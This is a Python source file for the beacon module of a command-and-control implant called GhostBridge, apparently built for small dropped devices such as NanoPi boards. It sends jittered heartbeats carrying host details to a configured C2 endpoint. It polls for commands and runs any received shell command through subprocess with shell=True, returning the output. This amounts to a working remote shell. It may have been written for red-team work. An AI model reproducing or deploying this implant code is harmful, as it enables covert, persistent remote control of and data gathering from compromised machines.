"""
Beacon Service

Periodic heartbeat service for C2 communication.
"""

from __future__ import annotations

import asyncio
import logging
import os
import random
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Callable, Optional

from ghostbridge.c2.client import Command, CommandResponse, MoMoClient, MoMoClientError
from ghostbridge.core.config import BeaconConfig, GhostBridgeConfig

logger = logging.getLogger(__name__)


@dataclass
class BeaconStats:
    """Beacon statistics."""

    total_beacons: int = 0
    successful_beacons: int = 0
    failed_beacons: int = 0
    last_beacon_time: Optional[datetime] = None
    last_success_time: Optional[datetime] = None
    last_error: Optional[str] = None
    commands_received: int = 0
    commands_executed: int = 0


@dataclass
class SystemInfo:
    """System information for beacon."""

    hostname: str = ""
    uptime_seconds: float = 0
    cpu_percent: float = 0
    memory_free_mb: int = 0
    disk_free_mb: int = 0
    cpu_temp: Optional[float] = None
    load_avg: tuple[float, float, float] = (0, 0, 0)


CommandHandler = Callable[[Command], CommandResponse]


class BeaconService:
    """
    Periodic beacon service for C2 communication.

    Features:
    - Regular heartbeat with jitter
    - Command polling and execution
    - System info collection
    - Error handling and recovery
    """

    def __init__(
        self,
        config: GhostBridgeConfig,
        client: Optional[MoMoClient] = None,
    ):
        """
        Initialize BeaconService.

        Args:
            config: GhostBridge configuration
            client: Optional pre-configured MoMo client
        """
        self.config = config
        self._client = client or MoMoClient(
            api_endpoint=config.c2.api_endpoint,
            device_id=config.device.id,
            timeout=config.c2.timeout,
            verify_ssl=config.c2.verify_ssl,
        )

        self._beacon_config = config.beacon
        self._stats = BeaconStats()
        self._running = False
        self._task: Optional[asyncio.Task] = None
        self._shutdown_event = asyncio.Event()
        self._start_time = datetime.now()

        # Command handlers
        self._handlers: dict[str, CommandHandler] = {}
        self._register_default_handlers()

        # External state providers
        self._tunnel_status_provider: Optional[Callable[[], str]] = None
        self._network_info_provider: Optional[Callable[[], dict]] = None

    @property
    def stats(self) -> BeaconStats:
        """Get beacon statistics."""
        return self._stats

    @property
    def is_running(self) -> bool:
        """Check if beacon service is running."""
        return self._running

    def set_tunnel_status_provider(self, provider: Callable[[], str]) -> None:
        """Set callback to get tunnel status."""
        self._tunnel_status_provider = provider

    def set_network_info_provider(self, provider: Callable[[], dict]) -> None:
        """Set callback to get network info."""
        self._network_info_provider = provider

    def register_handler(self, action: str, handler: CommandHandler) -> None:
        """
        Register command handler.

        Args:
            action: Command action name
            handler: Handler function
        """
        self._handlers[action] = handler
        logger.debug(f"Registered handler for action: {action}")

    def _register_default_handlers(self) -> None:
        """Register default command handlers."""

        def handle_status(cmd: Command) -> CommandResponse:
            """Handle status command."""
            info = self._collect_system_info()
            return CommandResponse(
                command_id=cmd.id,
                status="success",
                result={
                    "device_id": self.config.device.id,
                    "name": self.config.device.name,
                    "uptime": info.uptime_seconds,
                    "cpu_percent": info.cpu_percent,
                    "memory_free_mb": info.memory_free_mb,
                    "beacon_stats": {
                        "total": self._stats.total_beacons,
                        "successful": self._stats.successful_beacons,
                        "failed": self._stats.failed_beacons,
                    },
                },
            )

        def handle_ping(cmd: Command) -> CommandResponse:
            """Handle ping command."""
            return CommandResponse(
                command_id=cmd.id,
                status="success",
                result="pong",
            )

        def handle_shell(cmd: Command) -> CommandResponse:
            """Handle shell command execution."""
            import subprocess

            command = cmd.payload.get("command", "")
            timeout = cmd.payload.get("timeout", 30)

            if not command:
                return CommandResponse(
                    command_id=cmd.id,
                    status="error",
                    result=None,
                    error="No command specified",
                )

            try:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                )
                return CommandResponse(
                    command_id=cmd.id,
                    status="success",
                    result={
                        "stdout": result.stdout,
                        "stderr": result.stderr,
                        "returncode": result.returncode,
                    },
                )
            except subprocess.TimeoutExpired:
                return CommandResponse(
                    command_id=cmd.id,
                    status="error",
                    result=None,
                    error=f"Command timed out after {timeout}s",
                )
            except Exception as e:
                return CommandResponse(
                    command_id=cmd.id,
                    status="error",
                    result=None,
                    error=str(e),
                )

        def handle_config(cmd: Command) -> CommandResponse:
            """Handle config update command."""
            # For now, just return current config
            return CommandResponse(
                command_id=cmd.id,
                status="success",
                result=self.config.model_dump(),
            )

        self._handlers["status"] = handle_status
        self._handlers["ping"] = handle_ping
        self._handlers["shell"] = handle_shell
        self._handlers["execute"] = handle_shell
        self._handlers["config"] = handle_config

    def _collect_system_info(self) -> SystemInfo:
        """Collect system information."""
        info = SystemInfo()

        try:
            # Hostname
            import socket
            info.hostname = socket.gethostname()

            # Uptime
            info.uptime_seconds = (datetime.now() - self._start_time).total_seconds()

            # Try to get system stats (Linux)
            try:
                # Memory
                with open("/proc/meminfo") as f:
                    for line in f:
                        if line.startswith("MemAvailable:"):
                            kb = int(line.split()[1])
                            info.memory_free_mb = kb // 1024
                            break

                # Load average
                with open("/proc/loadavg") as f:
                    parts = f.read().split()
                    info.load_avg = (float(parts[0]), float(parts[1]), float(parts[2]))

                # CPU temperature (Raspberry Pi / NanoPi)
                temp_path = "/sys/class/thermal/thermal_zone0/temp"
                if os.path.exists(temp_path):
                    with open(temp_path) as f:
                        info.cpu_temp = int(f.read().strip()) / 1000

                # Disk space
                stat = os.statvfs("/")
                info.disk_free_mb = (stat.f_bavail * stat.f_frsize) // (1024 * 1024)

            except (FileNotFoundError, PermissionError, ValueError):
                pass

        except Exception as e:
            logger.debug(f"Error collecting system info: {e}")

        return info

    def _get_jittered_interval(self) -> float:
        """Get beacon interval with jitter."""
        base = self._beacon_config.interval
        jitter = self._beacon_config.jitter

        if jitter > 0:
            return base + random.uniform(-jitter, jitter)
        return float(base)

    async def _send_beacon(self) -> bool:
        """
        Send single beacon.

        Returns:
            True if successful
        """
        self._stats.total_beacons += 1
        self._stats.last_beacon_time = datetime.now()

        try:
            # Collect info
            sys_info = self._collect_system_info()

            tunnel_status = "unknown"
            if self._tunnel_status_provider:
                try:
                    tunnel_status = self._tunnel_status_provider()
                except Exception:
                    pass

            network_info = {}
            if self._network_info_provider:
                try:
                    network_info = self._network_info_provider()
                except Exception:
                    pass

            # Send beacon
            response = await self._client.beacon(
                status="active",
                tunnel_status=tunnel_status,
                uptime=sys_info.uptime_seconds,
                network_info=network_info,
                system_info={
                    "hostname": sys_info.hostname,
                    "cpu_temp": sys_info.cpu_temp,
                    "memory_free_mb": sys_info.memory_free_mb,
                    "disk_free_mb": sys_info.disk_free_mb,
                    "load_avg": list(sys_info.load_avg),
                },
            )

            self._stats.successful_beacons += 1
            self._stats.last_success_time = datetime.now()
            self._stats.last_error = None

            # Process any commands in response
            commands = response.get("commands", [])
            if commands:
                await self._process_commands(commands)

            return True

        except MoMoClientError as e:
            self._stats.failed_beacons += 1
            self._stats.last_error = str(e)
            logger.warning(f"Beacon failed: {e}")
            return False

        except Exception as e:
            self._stats.failed_beacons += 1
            self._stats.last_error = str(e)
            logger.error(f"Beacon error: {e}")
            return False

    async def _process_commands(self, commands: list[dict]) -> None:
        """Process commands from beacon response."""
        for cmd_data in commands:
            try:
                cmd = Command.from_dict(cmd_data)
                self._stats.commands_received += 1

                logger.info(f"Received command: {cmd.action} ({cmd.id})")

                # Find handler
                handler = self._handlers.get(cmd.action)

                if handler:
                    try:
                        response = handler(cmd)
                        self._stats.commands_executed += 1
                    except Exception as e:
                        logger.error(f"Command handler error: {e}")
                        response = CommandResponse(
                            command_id=cmd.id,
                            status="error",
                            result=None,
                            error=str(e),
                        )
                else:
                    logger.warning(f"Unknown command action: {cmd.action}")
                    response = CommandResponse(
                        command_id=cmd.id,
                        status="error",
                        result=None,
                        error=f"Unknown action: {cmd.action}",
                    )

                # Send response
                await self._client.send_response(response)

            except Exception as e:
                logger.error(f"Error processing command: {e}")

    async def start(self) -> None:
        """Start beacon service."""
        if self._running:
            return

        self._running = True
        self._shutdown_event.clear()

        async def beacon_loop() -> None:
            logger.info(
                f"Beacon service started (interval: {self._beacon_config.interval}s, "
                f"jitter: ±{self._beacon_config.jitter}s)"
            )

            # Initial beacon
            await self._send_beacon()

            while not self._shutdown_event.is_set():
                try:
                    # Wait with jitter
                    interval = self._get_jittered_interval()
                    logger.debug(f"Next beacon in {interval:.1f}s")

                    try:
                        await asyncio.wait_for(
                            self._shutdown_event.wait(),
                            timeout=interval,
                        )
                        break  # Shutdown requested
                    except asyncio.TimeoutError:
                        pass  # Normal timeout, send beacon

                    if not self._shutdown_event.is_set():
                        await self._send_beacon()

                except asyncio.CancelledError:
                    break
                except Exception as e:
                    logger.error(f"Beacon loop error: {e}")
                    await asyncio.sleep(30)  # Wait before retry

            logger.info("Beacon service stopped")

        self._task = asyncio.create_task(beacon_loop())

    async def stop(self) -> None:
        """Stop beacon service."""
        if not self._running:
            return

        self._running = False
        self._shutdown_event.set()

        if self._task:
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass
            self._task = None

        await self._client.close()

    async def force_beacon(self) -> bool:
        """
        Force immediate beacon.

        Returns:
            True if successful
        """
        return await self._send_beacon()


async def main() -> None:
    """Main entry point for beacon service."""
    import sys

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    )

    try:
        config = GhostBridgeConfig.load()
    except Exception as e:
        logger.error(f"Failed to load config: {e}")
        sys.exit(1)

    if not config.beacon.enabled:
        logger.warning("Beacon is disabled in configuration")
        sys.exit(0)

    beacon = BeaconService(config)

    try:
        await beacon.start()
        # Run forever
        while beacon.is_running:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        logger.info("Interrupted")
    finally:
        await beacon.stop()


if __name__ == "__main__":
    asyncio.run(main())

